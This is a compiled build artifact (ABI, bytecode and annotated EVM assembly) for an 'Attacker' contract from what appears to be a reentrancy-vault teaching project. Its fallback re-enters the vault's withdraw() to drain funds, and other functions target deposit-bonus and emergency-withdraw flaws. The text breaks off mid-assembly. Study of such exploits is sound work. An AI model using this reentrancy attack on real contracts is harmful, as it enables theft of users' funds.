{"abi":[{"type":"constructor","inputs":[{"name":"_vault","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"attackDepositBonus","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackEmergencyWithdraw","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"getAttackStats","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getVaultBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getVaultUserBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"totalStolen","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableVault"}],"stateMutability":"view"},{"type":"function","name":"withdrawStolenFunds","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"event","name":"AttackAttempted","inputs":[{"name":"attackType","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"reason","type":"string","indexed":false,"internalType":"string"}],"anonymous":false},{"type":"event","name":"AttackCompleted","inputs":[{"name":"totalStolen","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"AttackExecuted","inputs":[{"name":"attackCount","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"amount","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"SecurityTestPassed","inputs":[{"name":"testName","type":"string","indexed":false,"internalType":"string"}],"anonymous":false}],"bytecode":{"object":"0x608060405234801561000f575f80fd5b5060405161121e38038061121e83398101604081905261002e91610052565b5f80546001600160a01b0319166001600160a01b039290921691909117905561007f565b5f60208284031215610062575f80fd5b81516001600160a01b0381168114610078575f80fd5b9392505050565b6111928061008c5f395ff3fe608060405260043610610092575f3560e01c80639e5faafc116100575780639e5faafc14610636578063d9f9d5f21461063e578063ed12e8ef14610653578063fbfa77cf14610667578063fd2767541461069d575f80fd5b80630777586a146105bc5780631f22e4b3146105ef578063407c28211461061157806350a63df1146106265780637dd0ddf91461062e575f80fd5b366105b8576100b860405180606001604052806026815260200161110b602691396106b1565b6100ec60405180604001604052806012815260200171101010169022aa24103932b1b4b134b2379d60711b815250346106f7565b61012d6040518060400160405280601881526020017f2020202d2041747461636b20636f756e7420616e7465733a00000000000000008152506001546106f7565b61016e6040518060400160405280601881526020017f2020202d20546f74616c2073746f6c656e20616e7465733a00000000000000008152506002546106f7565b60408051808201909152601781527f2020202d2042616c616e63652064656c207661756c743a00000000000000000060208201525f546101b891906001600160a01b0316316106f7565b6101f76040518060400160405280601a81526020017f2020202d2042616c616e63652064656c2061747461636b65723a000000000000815250476106f7565b3460025f8282546102089190610f98565b909155505060018054905f61021c83610fb1565b91905055506102426040518060600160405280603781526020016110d4603791396106b1565b6102836040518060400160405280601a81526020017f2020202d2041747461636b20636f756e7420646573707565733a0000000000008152506001546106f7565b6102c46040518060400160405280601a81526020017f2020202d20546f74616c2073746f6c656e20646573707565733a0000000000008152506002546106f7565b600154604080519182523460208301527f61fb290b1aeb49a8eff0a91c4310d27d98e1199a1abab0312a9a39570824af7d910160405180910390a1600560015410801561031e57505f54346001600160a01b039091163110155b15610475576103446040518060600160405280602c8152602001611131602c91396106b1565b61037a60405180604001604052806012815260200171101010169020ba3a30b1b59031b7bab73a1d60711b8152506001546106f7565b60408051808201909152601e81527f2020202d205661756c742062616c616e636520646973706f6e69626c653a000060208201525f546103c491906001600160a01b0316316106f7565b6103fc60405180604001604052806016815260200175101010169020b6b7bab73a1030903932ba34b930b91d60511b815250346106f7565b61041d6040518060600160405280602481526020016110b0602491396106b1565b5f54604051632e1a7d4d60e01b81523460048201526001600160a01b0390911690632e1a7d4d906024015f604051808303815f87803b15801561045e575f80fd5b505af1158015610470573d5f803e3d5ffd5b505050505b600360015410801561048f5750670de0b6b3a76400004710155b156105b6576104b56040518060600160405280602f8152602001611081602f91396106b1565b6104eb60405180604001604052806012815260200171101010169020ba3a30b1b59031b7bab73a1d60711b8152506001546106f7565b61052a6040518060400160405280601a81526020017f2020202d2042616c616e63652064656c2061747461636b65723a000000000000815250476106f7565b61054b60405180606001604052806023815260200161105e602391396106b1565b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b15801561059e575f80fd5b505af11580156105b0573d5f803e3d5ffd5b50505050505b005b5f80fd5b3480156105c7575f80fd5b5060015460025447604080519384526020840192909252908201526060015b60405180910390f35b3480156105fa575f80fd5b50610603610740565b6040519081526020016105e6565b34801561061c575f80fd5b5061060360015481565b6105b66107af565b6105b66108d5565b6105b6610a4d565b348015610649575f80fd5b5061060360025481565b34801561065e575f80fd5b50610603610e0e565b348015610672575f80fd5b505f54610685906001600160a01b031681565b6040516001600160a01b0390911681526020016105e6565b3480156106a8575f80fd5b506105b6610e5e565b6106f4816040516024016106c5919061100c565b60408051601f198184030181529190526020810180516001600160e01b031663104c13eb60e21b179052610f61565b50565b61073c828260405160240161070d929190611025565b60408051601f198184030181529190526020810180516001600160e01b0316632d839cb360e21b179052610f61565b5050565b5f805460405163f8b2cb4f60e01b81523060048201526001600160a01b039091169063f8b2cb4f90602401602060405180830381865afa158015610786573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107aa9190611046565b905090565b670de0b6b3a76400003410156108025760405162461bcd60e51b815260206004820152601360248201527209ccacac840c2e840d8cac2e6e84062408aa89606b1b60448201526064015b60405180910390fd5b6108406040518060400160405280601a81526020017f41747461636b696e67206465706f73697420626f6e75732e2e2e0000000000008152506106b1565b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b15801561088b575f80fd5b505af115801561089d573d5f803e3d5ffd5b50505050506108d36040518060400160405280601081526020016f426f6e7573206578706c6f697465642160801b8152506106b1565b565b5f34116109195760405162461bcd60e51b81526020600482015260126024820152714e6565642045544820746f2061747461636b60701b60448201526064016107f9565b6109576040518060400160405280601e81526020017f41747461636b696e6720656d657267656e637957697468647261772e2e2e00008152506106b1565b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156109a2575f80fd5b505af11580156109b4573d5f803e3d5ffd5b50505f8054604080516336cb886f60e21b815290516001600160a01b03909216955063db2e21bc9450600480820194509082900301818387803b1580156109f9575f80fd5b505af1158015610a0b573d5f803e3d5ffd5b505050506108d36040518060400160405280601d81526020017f456d657267656e6379207769746864726177206578706c6f69746564210000008152506106b1565b5f3411610a915760405162461bcd60e51b81526020600482015260126024820152714e6565642045544820746f2061747461636b60701b60448201526064016107f9565b610acf6040518060400160405280601d81526020017f5374617274696e67207265656e7472616e63792061747461636b2e2e2e0000008152506106b1565b610b0e6040518060400160405280601981526020017f496e697469616c2061747461636b65722062616c616e63653a00000000000000815250476106f7565b610bb76040518060400160405280601681526020017524b734ba34b0b6103b30bab63a103130b630b731b29d60511b8152505f8054906101000a90046001600160a01b03166001600160a01b0316636f9fb98a6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610b8e573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610bb29190611046565b6106f7565b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610c02575f80fd5b505af1158015610c14573d5f803e3d5ffd5b505060408051808201825260168152752130b630b731b29030b33a32b9103232b837b9b4ba1d60511b60208201525f54915163f8b2cb4f60e01b8152306004820152610c8f95509093506001600160a01b03909116915063f8b2cb4f90602401602060405180830381865afa158015610b8e573d5f803e3d5ffd5b5f6001819055600281905554604051632e1a7d4d60e01b81523460048201526001600160a01b0390911690632e1a7d4d906024015f604051808303815f87803b158015610cda575f80fd5b505af1158015610cec573d5f803e3d5ffd5b50505050610d226040518060400160405280601181526020017041747461636b20636f6d706c657465642160781b8152506106b1565b610d536040518060400160405280600d81526020016c2a37ba30b61039ba37b632b71d60991b8152506002546106f7565b610dd1604051806040016040528060148152602001732334b730b6103b30bab63a103130b630b731b29d60611b8152505f8054906101000a90046001600160a01b03166001600160a01b0316636f9fb98a6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610b8e573d5f803e3d5ffd5b7f4ef6191345aae76824ed25ff5065e33a8fbbb5a05823ebba2291fc6237a925f9600254604051610e0491815260200190565b60405180910390a1565b5f805f9054906101000a90046001600160a01b03166001600160a01b0316636f9fb98a6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610786573d5f803e3d5ffd5b4780610ea35760405162461bcd60e51b81526020600482015260146024820152734e6f2066756e647320746f20776974686472617760601b60448201526064016107f9565b6040515f90339083908381818185875af1925050503d805f8114610ee2576040519150601f19603f3d011682016040523d82523d5f602084013e610ee7565b606091505b5050905080610f2a5760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b60448201526064016107f9565b61073c6040518060400160405280601581526020017429ba37b632b71022aa24103bb4ba34323930bbb71d60591b815250836106f7565b6106f4815f6a636f6e736f6c652e6c6f6790505f80835160208501845afa505050565b634e487b7160e01b5f52601160045260245ffd5b80820180821115610fab57610fab610f84565b92915050565b5f60018201610fc257610fc2610f84565b5060010190565b5f81518084525f5b81811015610fed57602081850181015186830182015201610fd1565b505f602082860101526020601f19601f83011685010191505092915050565b602081525f61101e6020830184610fc9565b9392505050565b604081525f6110376040830185610fc9565b90508260208301529392505050565b5f60208284031215611056575f80fd5b505191905056fe2020202d204c4c414d414e444f206465706f7369742829204e554556414d454e544521425245414b504f494e542041545441434b4552202d204578706c6f74616e646f206465706f73697420626f6e75733a2020202d204c4c414d414e444f2077697468647261772829204e554556414d454e544521425245414b504f494e542041545441434b4552202d20446573707565732064652061637475616c697a617220636f6e7461646f7265733a425245414b504f494e542041545441434b4552202d2052656365697665206c6c616d61646f3a425245414b504f494e542041545441434b4552202d20456a65637574616e646f207265656e7472616e63793aa26469706673582212209f3a064e423b25715573ab118b4e82e053b7eb10edb24e630d811c2710fa520664736f6c63430008140033","linkReferences":{}},"assembly":"    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:5432  contract Attacker is IAttacker {... */\n  mstore(0x40, 0x80)\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":600:684  constructor(address payable _vault) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  dup2\n  swap1\n  mstore\n  tag_2\n  swap2\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":646:651  vault */\n  0x00\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":646:677  vault = VulnerableVault(_vault) */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n  swap3\n  swap1\n  swap3\n  and\n  swap2\n  swap1\n  swap2\n  or\n  swap1\n  sstore\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:5432  contract Attacker is IAttacker {... */\n  jump(tag_7)\n    /* \"#utility.yul\":14:312   */\ntag_3:\n    /* \"#utility.yul\":92:98   */\n  0x00\n    /* \"#utility.yul\":145:147   */\n  0x20\n    /* \"#utility.yul\":133:142   */\n  dup3\n    /* \"#utility.yul\":124:131   */\n  dup5\n    /* \"#utility.yul\":120:143   */\n  sub\n    /* \"#utility.yul\":116:148   */\n  slt\n    /* \"#utility.yul\":113:165   */\n  iszero\n  tag_9\n  jumpi\n    /* \"#utility.yul\":161:162   */\n  0x00\n    /* \"#utility.yul\":158:159   */\n  dup1\n    /* \"#utility.yul\":151:163   */\n  revert\n    /* \"#utility.yul\":113:165   */\ntag_9:\n    /* \"#utility.yul\":187:203   */\n  dup2\n  mload\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":232:263   */\n  dup2\n  and\n    /* \"#utility.yul\":222:264   */\n  dup2\n  eq\n    /* \"#utility.yul\":212:282   */\n  tag_10\n  jumpi\n    /* \"#utility.yul\":278:279   */\n  0x00\n    /* \"#utility.yul\":275:276   */\n  dup1\n    /* \"#utility.yul\":268:280   */\n  revert\n    /* \"#utility.yul\":212:282   */\ntag_10:\n    /* \"#utility.yul\":301:306   */\n  swap4\n    /* \"#utility.yul\":14:312   */\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\ntag_7:\n    /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:5432  contract Attacker is IAttacker {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:5432  contract Attacker is IAttacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      gt\n      tag_13\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_8\n      jumpi\n      dup1\n      0xd9f9d5f2\n      eq\n      tag_9\n      jumpi\n      dup1\n      0xed12e8ef\n      eq\n      tag_10\n      jumpi\n      dup1\n      0xfbfa77cf\n      eq\n      tag_11\n      jumpi\n      dup1\n      0xfd276754\n      eq\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      dup1\n      0x0777586a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x1f22e4b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x407c2821\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x50a63df1\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x7dd0ddf9\n      eq\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2613:2666  console.log(\"BREAKPOINT ATTACKER - Receive llamado:\") */\n      tag_16\n      mload(0x40)\n      dup1\n      0x60\n      add\n      0x40\n      mstore\n      dup1\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      data_ac05c166d7c8ee919979307f9e5f597c4c1ca7971eb055eb1e9527482fcaaf76\n      0x26\n      swap2\n      codecopy\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2613:2624  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2613:2666  console.log(\"BREAKPOINT ATTACKER - Receive llamado:\") */\n      jump\t// in\n    tag_16:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2676:2720  console.log(\"   - ETH recibido:\", msg.value) */\n      tag_18\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x12\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x71, 0x101010169022aa24103932b1b4b134b2379d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2710:2719  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2676:2687  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2676:2720  console.log(\"   - ETH recibido:\", msg.value) */\n      jump\t// in\n    tag_18:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2730:2782  console.log(\"   - Attack count antes:\", attackCount) */\n      tag_20\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x18\n      dup2\n      mstore\n      0x20\n      add\n      0x2020202d2041747461636b20636f756e7420616e7465733a0000000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2770:2781  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2730:2741  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2730:2782  console.log(\"   - Attack count antes:\", attackCount) */\n      jump\t// in\n    tag_20:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2792:2844  console.log(\"   - Total stolen antes:\", totalStolen) */\n      tag_21\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x18\n      dup2\n      mstore\n      0x20\n      add\n      0x2020202d20546f74616c2073746f6c656e20616e7465733a0000000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2832:2843  totalStolen */\n      sload(0x02)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2792:2803  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2792:2844  console.log(\"   - Total stolen antes:\", totalStolen) */\n      jump\t// in\n    tag_21:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2854:2916  console.log(\"   - Balance del vault:\", address(vault).balance) */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x17\n      dup2\n      mstore\n      0x2020202d2042616c616e63652064656c207661756c743a000000000000000000\n      0x20\n      dup3\n      add\n      mstore\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2901:2906  vault */\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2854:2916  console.log(\"   - Balance del vault:\", address(vault).balance) */\n      tag_22\n      swap2\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2901:2906  vault */\n      and\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2893:2915  address(vault).balance */\n      balance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2854:2865  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2854:2916  console.log(\"   - Balance del vault:\", address(vault).balance) */\n      jump\t// in\n    tag_22:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2926:2990  console.log(\"   - Balance del attacker:\", address(this).balance) */\n      tag_23\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x2020202d2042616c616e63652064656c2061747461636b65723a000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2968:2989  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2926:2937  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2926:2990  console.log(\"   - Balance del attacker:\", address(this).balance) */\n      jump\t// in\n    tag_23:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3024:3033  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3009:3020  totalStolen */\n      0x02\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3009:3033  totalStolen += msg.value */\n      dup3\n      dup3\n      sload\n      tag_24\n      swap2\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap1\n      swap2\n      sstore\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3043:3054  attackCount */\n      0x01\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3043:3056  attackCount++ */\n      dup1\n      sload\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3043:3054  attackCount */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3043:3056  attackCount++ */\n      tag_26\n      dup4\n      tag_27\n      jump\t// in\n    tag_26:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3075:3145  console.log(\"BREAKPOINT ATTACKER - Despues de actualizar contadores:\") */\n      tag_28\n      mload(0x40)\n      dup1\n      0x60\n      add\n      0x40\n      mstore\n      dup1\n      0x37\n      dup2\n      mstore\n      0x20\n      add\n      data_8c119e9453b9fe84e944a38959af375701bf93bd8a15c877916db9b641e7155a\n      0x37\n      swap2\n      codecopy\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3075:3086  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3075:3145  console.log(\"BREAKPOINT ATTACKER - Despues de actualizar contadores:\") */\n      jump\t// in\n    tag_28:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3155:3209  console.log(\"   - Attack count despues:\", attackCount) */\n      tag_29\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x2020202d2041747461636b20636f756e7420646573707565733a000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3197:3208  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3155:3166  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3155:3209  console.log(\"   - Attack count despues:\", attackCount) */\n      jump\t// in\n    tag_29:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3219:3273  console.log(\"   - Total stolen despues:\", totalStolen) */\n      tag_30\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x2020202d20546f74616c2073746f6c656e20646573707565733a000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3261:3272  totalStolen */\n      sload(0x02)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3219:3230  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3219:3273  console.log(\"   - Total stolen despues:\", totalStolen) */\n      jump\t// in\n    tag_30:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3312:3323  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3297:3335  AttackExecuted(attackCount, msg.value) */\n      0x40\n      dup1\n      mload\n        /* \"#utility.yul\":590:615   */\n      swap2\n      dup3\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3325:3334  msg.value */\n      callvalue\n        /* \"#utility.yul\":646:648   */\n      0x20\n        /* \"#utility.yul\":631:649   */\n      dup4\n      add\n        /* \"#utility.yul\":624:658   */\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3297:3335  AttackExecuted(attackCount, msg.value) */\n      0x61fb290b1aeb49a8eff0a91c4310d27d98e1199a1abab0312a9a39570824af7d\n      swap2\n        /* \"#utility.yul\":563:581   */\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3297:3335  AttackExecuted(attackCount, msg.value) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3508:3509  5 */\n      0x05\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3494:3505  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3494:3509  attackCount < 5 */\n      lt\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3494:3548  attackCount < 5 && address(vault).balance >= msg.value */\n      dup1\n      iszero\n      tag_33\n      jumpi\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3521:3526  vault */\n      sload(0x00)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3539:3548  msg.value */\n      callvalue\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3521:3526  vault */\n      swap1\n      swap2\n      and\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3513:3535  address(vault).balance */\n      balance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3513:3548  address(vault).balance >= msg.value */\n      lt\n      iszero\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3494:3548  attackCount < 5 && address(vault).balance >= msg.value */\n    tag_33:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3490:3956  if (attackCount < 5 && address(vault).balance >= msg.value) {... */\n      iszero\n      tag_34\n      jumpi\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3564:3623  console.log(\"BREAKPOINT ATTACKER - Ejecutando reentrancy:\") */\n      tag_35\n      mload(0x40)\n      dup1\n      0x60\n      add\n      0x40\n      mstore\n      dup1\n      0x2c\n      dup2\n      mstore\n      0x20\n      add\n      data_dcf3f909ab2f47b955f8e92e4b9bee76e86a2c77f21a1daae57900c890cf7e3e\n      0x2c\n      swap2\n      codecopy\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3564:3575  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3564:3623  console.log(\"BREAKPOINT ATTACKER - Ejecutando reentrancy:\") */\n      jump\t// in\n    tag_35:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3637:3683  console.log(\"   - Attack count:\", attackCount) */\n      tag_36\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x12\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x71, 0x101010169020ba3a30b1b59031b7bab73a1d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3671:3682  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3637:3648  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3637:3683  console.log(\"   - Attack count:\", attackCount) */\n      jump\t// in\n    tag_36:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3697:3766  console.log(\"   - Vault balance disponible:\", address(vault).balance) */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      swap1\n      swap2\n      mstore\n      0x1e\n      dup2\n      mstore\n      0x2020202d205661756c742062616c616e636520646973706f6e69626c653a0000\n      0x20\n      dup3\n      add\n      mstore\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3751:3756  vault */\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3697:3766  console.log(\"   - Vault balance disponible:\", address(vault).balance) */\n      tag_37\n      swap2\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3751:3756  vault */\n      and\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3743:3765  address(vault).balance */\n      balance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3697:3708  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3697:3766  console.log(\"   - Vault balance disponible:\", address(vault).balance) */\n      jump\t// in\n    tag_37:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3780:3828  console.log(\"   - Amount a retirar:\", msg.value) */\n      tag_38\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x16\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x51, 0x101010169020b6b7bab73a1030903932ba34b930b91d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3818:3827  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3780:3791  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3780:3828  console.log(\"   - Amount a retirar:\", msg.value) */\n      jump\t// in\n    tag_38:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3842:3893  console.log(\"   - LLAMANDO withdraw() NUEVAMENTE!\") */\n      